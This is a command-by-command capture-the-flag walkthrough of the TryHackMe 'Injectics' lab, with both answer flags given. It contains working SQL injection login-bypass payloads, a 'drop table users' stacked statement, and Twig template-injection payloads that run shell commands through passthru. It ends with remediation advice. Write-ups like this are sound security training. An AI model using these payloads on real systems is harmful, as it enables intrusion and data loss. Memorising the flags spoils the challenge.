# TryHackMe Injectics — Complete Command-by-Command Walkthrough

**Room:** Injectics (Premium)  
**Platform:** TryHackMe  
**Lab date:** 14 November 2026  
**Target IP:** `10.82.166.61` (temporary lab address)  
**Attacker:** Kali Linux, connected over TryHackMe OpenVPN  
**Working directory:** `/home/kali/THM/injectics`  
**Tools:** OpenVPN, Nmap, Gobuster, cURL, grep, sed, zsh/bash  
**Result:** Both flags recovered; SQL injection, information disclosure, and server-side template injection demonstrated.

> **Scope / spoiler notice.** This write-up reproduces actions taken in the *authorized, disposable TryHackMe lab*. It contains both answer flags and a database-destructive payload that was part of the challenge. Do **not** reuse these commands against systems without permission. The document reproduces recorded evidence; it does not claim testing beyond the provided terminal session.

## 0. Objectives and verified results

| Objective | Verified outcome |
|---|---|
| Connect Kali to target | `tun0` UP; 4/4 pings; HTTP `200` |
| Enumerate web application | Apache 2.4.41 on TCP/80; vulnerable paths identified |
| Bypass user authentication | `/functions.php` returned `"status":"success"` |
| Manipulate database recovery | Application reported an important table deleted |
| Authenticate as administrator | HTTP `302` to `dashboard.php` after recovery |
| Retrieve admin flag | `THM{INJECTICS_ADMIN_PANEL_007}` |
| Demonstrate SSTI | `{{7*7}}` rendered as `Welcome, 49!` |
| Execute server command | `id` returned `uid=33(www-data)` |
| Retrieve hidden flag | `THM{5735172b6c147f4dd649872f73e0fdea}` |

## 1. Prepare the workspace and connect to TryHackMe VPN

### Command 1 — Create / enter the evidence directory

```bash
mkdir -p ~/THM/injectics
cd ~/THM/injectics
pwd
```

**Observed path:**

```text
/home/kali/THM/injectics
```

### Command 2 — Initial OpenVPN attempt (failure)

```bash
openvpn --config /home/kali/Downloads/eu-west-1-ShadowVector-premium.ovpn
```

**Observed error:**

```text
sitnl_send: rtnl: generic error (-1): Operation not permitted
Cannot allocate DCO dev dynamically
Exiting due to fatal error
```

The TLS exchange succeeded, but the process lacked the privileges to create the VPN interface. The separate `mssfix` push-options warning was not the fatal cause.

### Command 3 — Working VPN connection

```bash
sudo openvpn --config /home/kali/Downloads/eu-west-1-ShadowVector-premium.ovpn
```

**Observed evidence:**

```text
DCO device tun0 opened
net_iface_up: set tun0 up
net_addr_v4_add: 192.168.135.174/18 dev tun0
Initialization Sequence Completed
Data Channel: cipher 'AES-256-GCM'
```

Leave this OpenVPN terminal running while testing from a second terminal. In the captured session, **`sudo` alone corrected the fatal error**; `--disable-dco` was not needed.

### Command 4 — Confirm interface, route, ICMP and HTTP

```bash
ip -br addr show tun0
ip route get 10.82.166.61
ping -c 4 10.82.166.61
curl -v --connect-timeout 10 http://10.82.166.61/
```

**Observed excerpts:**

```text
tun0 UP 192.168.135.174/18
10.82.166.61 via 192.168.128.1 dev tun0 src 192.168.135.174
4 packets transmitted, 4 received, 0% packet loss
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
```

**Troubleshooting note:** The terminal also showed a `goenv` PATH-order warning. That warning relates to Go version selection and does **not** affect OpenVPN or HTTP access.

## 2. Reconnaissance and directory discovery

### Command 5 — Service detection with Nmap

```bash
cd ~/THM/injectics
sudo nmap -Pn -sV -p 80,443,8080 \
  10.82.166.61 \
  -oN nmap_connected.txt
```

**Observed output:**

```text
PORT     STATE   SERVICE    VERSION
80/tcp   open    http       Apache httpd 2.4.41 ((Ubuntu))
443/tcp  closed  https
8080/tcp closed  http-proxy
```

Earlier, before the VPN connected, the same three ports had appeared **filtered**. That earlier result was a connectivity symptom, not evidence that the application was unreachable after VPN setup.

### Command 6 — Enumerate directories and extensions

```bash
gobuster dir \
  -u http://10.82.166.61/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,js,log \
  -t 20 \
  -o gobuster.txt
```

**Selected observed results:**

```text
conn.php         (Status: 200) [Size: 0]
dashboard.php    (Status: 302) [Size: 0]
flags            (Status: 301)
functions.php    (Status: 200) [Size: 0]
index.php        (Status: 200) [Size: 6588]
login.php        (Status: 200) [Size: 5401]
mail.log         (Status: 200) [Size: 1098]
phpmyadmin       (Status: 301)
script.js        (Status: 200) [Size: 1088]
vendor           (Status: 301)
```

**Interpretation:** `mail.log` and `script.js` were retrievable. A `200` response on a PHP endpoint does not mean PHP source was disclosed. `/flags/` existed, but its presence did not prove that directory listing was publicly allowed.

## 3. Investigate information disclosure and login logic

### Command 7 — Download exposed application files

```bash
cd ~/THM/injectics
curl -sS http://10.82.166.61/mail.log -o mail.log
curl -sS http://10.82.166.61/script.js -o script.js
curl -sS http://10.82.166.61/login.php -o login.html
cat mail.log
cat script.js
```

**Significant evidence from `mail.log`:** The Injectics service checks database state every minute and recreates the `users` table with default credentials after deletion/corruption. The message disclosed these training credentials:

```text
superadmin@injectics.thm : superSecurePasswd101
dev@injectics.thm        : devPasswd123
```

**Significant evidence from `script.js`:**

```javascript
const invalidKeywords = ['or', 'and', 'union', 'select', '"', "'"];
$.ajax({
    url: 'functions.php',
    type: 'POST',
    data: {
        username: username,
        password: password,
        function: 'login'
    },
    dataType: 'json'
});
```

The blacklist was implemented in browser-side JavaScript. Direct HTTP requests to `functions.php` were not subject to that browser check. This alone did not establish that server-side validation was absent; the subsequent SQLi results did.

### Command 8 — Confirm login form input names

```bash
grep -niE 'form|input|action=|method=|name=|password' login.html
```

**Observed HTML details:** `id="email" name="mail"` and `id="pwd" name="pass"`. Despite those form input names, the AJAX request actually sent backend fields named `username`, `password`, and `function`.

### Command 9 — Inspect the separate administrator login page

```bash
curl -i --max-time 10 \
  http://10.82.166.61/adminLogin007.php
```

**Observed result:** HTTP `200`, with a form using `method="POST"`, `action="adminLogin007.php"`, and fields `mail` and `pass`.

### Command 10 — Test recovered-looking admin credentials before recovery

```bash
curl -sS -i \
  -c admin.cookies -b admin.cookies \
  --data-urlencode 'mail=superadmin@injectics.thm' \
  --data-urlencode 'pass=superSecurePasswd101' \
  http://10.82.166.61/adminLogin007.php
```

**Observed result:** HTML displayed `Invalid email or password.` The default credentials were not usable at this point.

## 4. SQL injection authentication bypass

### Command 11 — Basic boolean SQLi attempt (failed)

```bash
curl -sS -i \
  -c user.cookies -b user.cookies \
  --data-urlencode "username=' OR 1=1-- -" \
  --data-urlencode 'password=test' \
  --data-urlencode 'function=login' \
  http://10.82.166.61/functions.php
```

**Observed response:**

```json
{"status":"error","message":"Invalid email or password"}
```

### Command 12 — Comment-out password condition (worked)

```bash
curl -sS -i \
  -c user.cookies -b user.cookies \
  --data-urlencode "username=superadmin@injectics.thm'-- -" \
  --data-urlencode 'password=test' \
  --data-urlencode 'function=login' \
  http://10.82.166.61/functions.php
```

**Observed response:**

```json
{"status":"success","message":"Login successful","is_admin":"true","first_name":"admin","last_name":null,"redirect_link":"dashboard.php?isadmin=false"}
```

The injected quote and SQL comment altered the authentication query so that a test password was accepted. The `is_admin` JSON field did **not** yet prove access to the separate administrator interface.

### Command 13 — Alternative SQLi (also worked)

```bash
curl -sS -i \
  -c user.cookies -b user.cookies \
  --data-urlencode "username=' || 1=1;-- -" \
  --data-urlencode 'password=test' \
  --data-urlencode 'function=login' \
  http://10.82.166.61/functions.php
```

**Observed response:**

```json
{"status":"success","message":"Login successful","is_admin":"true","first_name":"dev","last_name":"dev","redirect_link":"dashboard.php?isadmin=false"}
```

This second login changed the active `user.cookies` session to the **dev** account, as confirmed by `Welcome, dev!` on the dashboard.

### Command 14 — Verify authenticated dashboard and editing links

```bash
curl -sS -i \
  -b user.cookies \
  'http://10.82.166.61/dashboard.php?isadmin=false' \
  -o dashboard_response.txt

grep -niE 'welcome|leaderboard|edit|logout|country|gold|silver|bronze' \
  dashboard_response.txt
```

**Observed evidence:** HTTP `200`, `Welcome, dev!`, and leaderboard edit links such as `edit_leaderboard.php?rank=1&country=USA`.

## 5. Leaderboard SQL injection and scheduled database recovery

### Command 15 — Read the leaderboard edit form

```bash
curl -sS \
  -b user.cookies \
  'http://10.82.166.61/edit_leaderboard.php?rank=1&country=USA' \
  -o edit.html

grep -niE 'form|action|input|name=|gold|silver|bronze' edit.html
```

**Observed parameters:** `rank=1`, `country=`, `gold=22`, `silver=21`, and `bronze=12345`. The form posted to `edit_leaderboard.php`.

### Command 16 — Submit the lab-only stacked-statement payload

> **Destructive lab action.** This statement deletes the disposable TryHackMe `users` table, intentionally invoking the challenge's recovery mechanism. It must not be run outside this authorized environment.

```bash
curl -sS -i \
  -b user.cookies \
  --data-urlencode 'rank=1' \
  --data-urlencode 'country=' \
  --data-urlencode 'gold=22; drop table users;-- -' \
  --data-urlencode 'silver=21' \
  --data-urlencode 'bronze=12345' \
  http://10.82.166.61/edit_leaderboard.php
```

**Immediate observed response:**

```text
HTTP/1.1 302 Found
Location: dashboard.php
```

A redirect alone is not proof of the `DROP TABLE` statement succeeding.

### Command 17 — Check database recovery through the admin login

```bash
curl -sS -i \
  -c admin.cookies -b admin.cookies \
  --data-urlencode 'mail=superadmin@injectics.thm' \
  --data-urlencode 'pass=superSecurePasswd101' \
  http://10.82.166.61/adminLogin007.php
```

**Observed response:**

```text
Seems like database or some important table is deleted.
InjecticsService is running to restore it. Please wait for 1-2 minutes.
```

This is decisive evidence that the application detected the missing table and entered recovery, matching the public email's description.

## 6. Administrator access and Flag 1

### Command 18 — Reauthenticate after recovery

```bash
rm -f admin.cookies
curl -sS -i \
  -c admin.cookies \
  --data-urlencode 'mail=superadmin@injectics.thm' \
  --data-urlencode 'pass=superSecurePasswd101' \
  http://10.82.166.61/adminLogin007.php
```

**Observed result:**

```text
HTTP/1.1 302 Found
Location: dashboard.php
Set-Cookie: PHPSESSID=...; path=/
```

The session-cookie value is intentionally omitted here. The next request confirmed the authentication succeeded.

### Command 19 — Fetch dashboard and extract first flag

```bash
curl -sS -L --max-redirs 5 \
  -b admin.cookies -c admin.cookies \
  http://10.82.166.61/dashboard.php \
  -o admin_dashboard.html

grep -niE 'THM\{|flag|admin|profile|welcome' admin_dashboard.html
grep -oE 'THM\{[^}]+\}' admin_dashboard.html
```

**Observed output:**

```text
Welcome, admin!
THM{INJECTICS_ADMIN_PANEL_007}
```

**Flag 1:** `THM{INJECTICS_ADMIN_PANEL_007}`. The dashboard also linked to `/update_profile.php`.

## 7. Server-side template injection (SSTI)

### Command 20 — Inspect administrator profile form

```bash
curl -sS \
  -b admin.cookies \
  http://10.82.166.61/update_profile.php \
  -o profile.html

grep -niE 'form|action=|method=|input|name=|first|last|submit' \
  profile.html
```

**Observed:** `method="post"`, `action="/update_profile.php"`, and fields `email`, `fname`, and `lname`.

### Command 21 — Store a non-destructive arithmetic expression

```bash
curl -sS -i \
  -b admin.cookies -c admin.cookies \
  --data-urlencode 'email=superadmin@injectics.thm' \
  --data-urlencode 'fname={{7*7}}' \
  --data-urlencode 'lname=' \
  http://10.82.166.61/update_profile.php \
  -o ssti_response.txt
```

**Observed form response:** `Profile updated successfully.`; the input field retained the literal value `{{7*7}}`.

### Command 22 — Confirm server-side evaluation on the dashboard

```bash
curl -sS \
  -b admin.cookies \
  http://10.82.166.61/dashboard.php \
  -o ssti_dashboard.html

grep -niE 'Welcome|49|7\*7|error' ssti_dashboard.html
```

**Observed result:**

```text
89:            Welcome, 49!            </h3>
```

This was **stored/second-order SSTI**: the profile accepted text but the dashboard later evaluated it as template syntax.

## 8. Twig command execution and hidden-file flag

### Command 23 — Define a reusable helper in the current shell

```bash
cd ~/THM/injectics

ssti() {
  curl -sS \
    -b admin.cookies \
    -c admin.cookies \
    --data-urlencode 'email=superadmin@injectics.thm' \
    --data-urlencode "fname=$1" \
    --data-urlencode 'lname=' \
    http://10.82.166.61/update_profile.php \
    > /dev/null

  curl -sS \
    -b admin.cookies \
    http://10.82.166.61/dashboard.php \
    | sed -n '85,105p'
}
```

This function submits a payload as the administrator's `fname`, then fetches the relevant dashboard lines. **The function must be entered in the current terminal before the `ssti` commands below.**

### Command 24 — Verify OS command execution

```bash
ssti "{{['id','']|sort('passthru')|join}}"
```

**Observed result:**

```text
Welcome, uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The Twig `sort` callback invoked PHP `passthru` during template rendering. This showed command execution as the web-server account `www-data`, **not** root.

### Command 25 — Enumerate the lab's flags directory

```bash
ssti "{{['ls -la /var/www/html/flags 2>&1','']|sort('passthru')|join}}"
```

**Observed excerpt:**

```text
-rw-rw-r-- 1 ubuntu ubuntu 38 Jul 18 2024 5d8af1dc14503c7e4bdc8e51a3469f48.txt
```

### Command 26 — Read the second flag

```bash
ssti "{{['cat /var/www/html/flags/*.txt 2>&1','']|sort('passthru')|join}}"
```

**Observed excerpt:**

```text
Welcome, THM{5735172b6c147f4dd649872f73e0fdea}
```

**Flag 2:** `THM{5735172b6c147f4dd649872f73e0fdea}`.

## 9. Findings and recommendations

| Finding | Impact observed in the lab | Remediation |
|---|---|---|
| SQLi in `/functions.php` | Password validation bypass | Server-side parameterized SQL queries; secure authentication handling |
| SQLi in `/edit_leaderboard.php` | Stacked statements; loss of `users` table | Parameterized updates, numeric validation, least-privilege DB account, disable multi-statements where feasible |
| Exposed `/mail.log` | Default credentials and recovery mechanism disclosed | Remove logs from document root; redact secrets and rotate compromised passwords |
| Predictable recovery credentials | Post-recovery administrator login with public password | Generate one-time recovery secrets; require controlled admin provisioning |
| SSTI in `fname` | Template expression execution when profile rendered | Treat profile content as data; safe template rendering; no dynamic compilation of untrusted values |
| Twig callback abuse | Arbitrary command execution as `www-data` | Patch template engine; enforce sandbox/allowlists; disable dangerous callable paths |
| Secret file readable by web process | Local flag file disclosed | Store sensitive files outside web root and restrict filesystem access |

## 10. Evidence handling, cleanup and takeaways

**Local files referenced:** `nmap.txt`, `nmap_connected.txt`, `gobuster.txt`, `mail.log`, `script.js`, `login.html`, `dashboard_response.txt`, `edit.html`, `admin_dashboard.html`, `profile.html`, `ssti_response.txt`, and `ssti_dashboard.html`. The transcript supplied by the tester is the primary evidence. No screenshots were supplied or invented.

**Important practical lessons:** Always verify the VPN route before scanning; do not assume browser-side filters protect backend code; test actual POST field names; distinguish a redirect from exploit confirmation; maintain cookies for authenticated requests; recognize second-order SSTI; and report the command-execution identity correctly.

**Before publishing:** Do not commit `admin.cookies`, `user.cookies`, private `.ovpn` files, or other session/authentication artifacts. Flag the GitHub or Medium post as a **spoiler**. The observed lab IP is ephemeral.

## 11. Final outcome

```text
FLAG 1: THM{INJECTICS_ADMIN_PANEL_007}
FLAG 2: THM{5735172b6c147f4dd649872f73e0fdea}
```

Both challenge flags were recovered. The documented exploit chain was **information disclosure → SQL injection login bypass → stacked SQL injection → forced recovery → administrator authentication → second-order SSTI → remote command execution → local flag retrieval**.

**Source:** User-supplied Kali terminal session, 14 November 2026. The commands and observed outputs above are reconstructed directly from that evidence with only formatting/line wrapping changes and explicit omission of session-token values.
